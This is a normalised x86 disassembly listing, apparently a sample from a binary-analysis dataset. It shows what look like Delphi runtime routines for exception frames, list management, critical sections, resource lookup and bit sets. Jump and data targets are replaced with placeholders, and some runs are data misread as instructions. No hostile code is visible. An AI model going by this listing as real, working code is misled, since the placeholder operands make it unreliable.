mov eax [ eax + 0x4 ]
mov edx ebx
call sub_417414
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_417570
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_416448
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_417414
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_417570
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_416b26
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_416b4c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_416b7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_41690c
xor edx edx
push ebp
push sub_416bf3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4169c4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403b20
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417570
mov edx [ ebp - 0x4 ]
call sub_4163e8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416c10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_416c70
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c77
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_416c7c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41690c
xor eax eax
push ebp
push sub_416cc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_416770
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416cc9
mov eax [ rw-data ]
call sub_4169c4
retn
sub_416cd0
push ebx
push esi
mov esi eax
mov eax esi
call sub_416c7c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_416c10
sub_416cf0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41690c
xor eax eax
push ebp
push sub_416d55
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_416930
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_416918
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d5c
mov eax [ rw-data ]
call sub_4169c4
retn
mov eax ebx
call sub_403274
mov ebx eax
sub_416d60
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41690c
xor eax eax
push ebp
push sub_416da2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4169d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416da9
mov eax [ rw-data ]
call sub_4169c4
retn
sub_416dac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41690c
xor eax eax
push ebp
push sub_416dee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_416974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416df5
mov eax [ rw-data ]
call sub_4169c4
retn
sub_416df8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_41690c
xor eax eax
push ebp
push sub_416e3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_416844
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e46
mov eax [ rw-data ]
call sub_4169c4
retn
sub_416e4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41690c
xor eax eax
push ebp
push sub_416e9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_416610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ea1
mov eax [ rw-data ]
call sub_4169c4
retn
sub_416eac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_416f00
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40360c
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_416f38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416f00
mov edx eax
mov eax [ rw-data ]
call sub_417854
pop edi
pop esi
pop ebx
retn
sub_416f64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4178dc
mov esi eax
xor edx edx
push ebp
push sub_416fce
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_417940
retn
mov edx ebx
mov eax esi
call sub_417570
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403b20
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416fe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407fd4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417020
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_40408c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_417064
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4175cc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_417414
sub_4170bc
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417570
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4170fc
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4170bc
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_417120
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4044f8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419b78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417194
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_419678
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
sub_4171a4
push ebx
call sub_406058
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406058
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_417414
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov ebx eax
call sub_406058
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov ebx eax
call sub_406058
mov [ eax + 0xc ] ebx
sub_4171fc
push ebx
push esi
push edi
call sub_406058
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_417570
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_41722c
push ebx
push esi
call sub_406058
mov eax [ eax + 0x8 ]
call sub_4032e8
call sub_406058
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_417658
mov esi eax
call sub_406058
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_417460
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406058
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4032e8
sub_417288
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41731e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417325
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403274
call sub_417288
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403238
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405308
call sub_405358
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_417120
or bl al
sub_417330
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4173de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4173bf
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403230
call sub_417288
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4171a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173c6
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4171fc
retn
call sub_41722c
sub_4173f4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_417414
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_417460
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4174fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_402968
mov edx esi
mov eax ebx
call sub_417570
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4174c4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4174c0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
jmp sub_403a74
sub_4174fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_417544
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405dec
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4174c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41754b
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_417570
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4174fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_417598
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4176d4
retn
sub_4175cc
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_4175ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4174fc
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_402968
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_417664
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4174fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4176b4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4175cc
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_417460
sub_4176d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4174fc
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4027ac
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_417710
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4174fc
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4176d4
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402cfc
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_417460
dec ebp
inc edi
jne r-xdata
sub_417784
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4177d8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403674
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4178dc
xor eax eax
push ebp
push sub_41783a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4032e8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4032d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417841
mov eax [ ebp - 0x4 ]
call sub_417940
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_417854
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4178dc
xor eax eax
push ebp
push sub_4178d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_417414
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4175cc
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178d7
mov eax [ ebp - 0x4 ]
call sub_417940
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4174fc
sub_4178f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4178dc
xor eax eax
push ebp
push sub_417933
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4176b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41793a
mov eax [ ebp - 0x4 ]
call sub_417940
retn
sub_41794c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4179a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4179a0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41797c
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_40276c
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402cfc
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_40278c
mov edx edi
mov eax ebp
call sub_417994
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_402968
sub_417a44
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41797c
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4179a0
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_417a70
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_417ae8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_41a368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_417b28
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417bde
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403238
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403238
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417be5
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_417c04
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_417c99
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403238
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40429c
mov eax ebx
mov si 0xffff
call sub_4034e4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ca0
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
mov si 0xffff
call sub_4034e4
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4034e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4043b8
sub_417cab
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40353c
mov eax ebx
mov si 0xffff
call sub_4034e4
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4034e4
push eax
lea eax [ ebx + 0x4 ]
call sub_405928
mov ecx eax
mov edx r-xdata
pop eax
call sub_40339c
sub_417cf6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_417d48
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_417d70
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_417d90
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
